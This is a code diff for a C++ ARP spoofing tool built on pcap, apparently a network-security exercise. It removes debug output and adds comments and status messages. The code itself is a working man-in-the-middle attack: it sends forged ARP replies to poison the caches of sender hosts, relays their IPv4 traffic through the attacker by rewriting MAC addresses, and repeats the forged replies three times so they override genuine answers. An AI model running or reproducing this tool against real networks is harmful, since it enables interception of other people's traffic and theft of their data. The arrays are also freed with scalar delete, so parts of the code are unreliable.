@@ -15,6 +15,12 @@
 
 using namespace std;
 
+
+struct SESSION {
+	MAC sender_mac, target_mac;
+	uint32_t sender_ip, target_ip;
+};
+
 int size;
 
 // get my mac address from ioctl
@@ -64,7 +70,6 @@ void find_mac(pcap_t *handle, MAC *mac, uint32_t *ip, MAC my_mac, uint32_t my_ip
 		while (true) {
 			if (count % 100 == 0) {
 				pcap_sendpacket(handle, (uint8_t*)(&request_packet), sizeof(request_packet));
-				//printf("send\n");
 			}
 			struct pcap_pkthdr *header;
 			const u_char* packet;
@@ -90,12 +95,10 @@ void spoofing(pcap_t *handle, MAC *sender_mac, uint32_t *sender_ip, MAC *target_
 	// send arp
 	for (int i=0; i<size; i++) {
 		PACKET p = PACKET(sender_mac[i], my_mac, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
-		p.print();
 		pcap_sendpacket(handle, (uint8_t*)(&p), sizeof(p));
 	}
-	// spoofing
-	printf("send spoofing packet\n");
 
+	// spoofing
 	MAC broadcast = MAC(1);
 	while (true) {
 		struct pcap_pkthdr *header;
@@ -107,26 +110,20 @@ void spoofing(pcap_t *handle, MAC *sender_mac, uint32_t *sender_ip, MAC *target_
 		PACKET *p = (struct PACKET*)packet;
 		for (int i=0; i<size; i++) {
 			if (p->is_smac(sender_mac[i])) {
+				// redirection
 				if (p->is_ipv4() && p->is_dmac(my_mac)) {
-					printf("------%ld-------\n", header->caplen);
-					for (int k=0; k<header->caplen; k++) 
-						printf("%02x.", packet[k]);
-					printf("\n");
-					
+					// change ethernet mac address
 					memcpy((void*)packet, (uint8_t*)&target_mac[i], 6);
 					memcpy((void*)(packet+6), (uint8_t*)&my_mac, 6);
-					PACKET *x = (struct PACKET*)packet;
-					
-					for (int k=0; k<header->caplen; k++)
-						printf("%02x.", packet[k]);
-					printf("\n");
 					
 					pcap_sendpacket(handle, packet, header->caplen);
 				}
+				// send arp
 				else if (p->is_arp_request()) {
 					if (p->is_target_ip(target_ip[i])) {
-						printf("arp\n");
 						PACKET p = PACKET(sender_mac[i], my_mac, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
+						// If real target reply, our reply can be ignored.
+						// So send 3 times!
 						for (int i=0; i<3; i++)
 							pcap_sendpacket(handle, (uint8_t*)(&p), sizeof(p));
 					}
@@ -159,11 +156,12 @@ int main(int argc, char *argv[]) {
 	getIpAddress(iface, my_ip);
 	getMacAddress(iface, mac);
 	MAC my_mac = MAC(mac);
-	my_mac.print();	
+
 	uint32_t *sender_ip = new uint32_t[size];
 	uint32_t *target_ip = new uint32_t[size];
 	MAC *sender_mac = new MAC[size];
 	MAC *target_mac = new MAC[size];
+	
 
 	for (int i=0; i<size; i++) {
 		sender_ip[i] = inet_addr(argv[2*i + 2]);
@@ -177,14 +175,15 @@ int main(int argc, char *argv[]) {
 	}	
 
 	find_mac(handle, sender_mac, sender_ip, my_mac, my_ip);
-	printf("find sender mac\n");
+	printf("[+] Find senders' mac\n");
 	find_mac(handle, target_mac, target_ip, my_mac, my_ip);
-	printf("find target mac\n");
+	printf("[+] Find targets' mac\n");
 
+	printf("[+] Start ARP SPOOFING\n");
 	spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, my_ip);
 	
 	delete sender_ip;
-	delete target_ip;
 	delete sender_mac;
+	delete target_ip;
 	delete target_mac;
 }
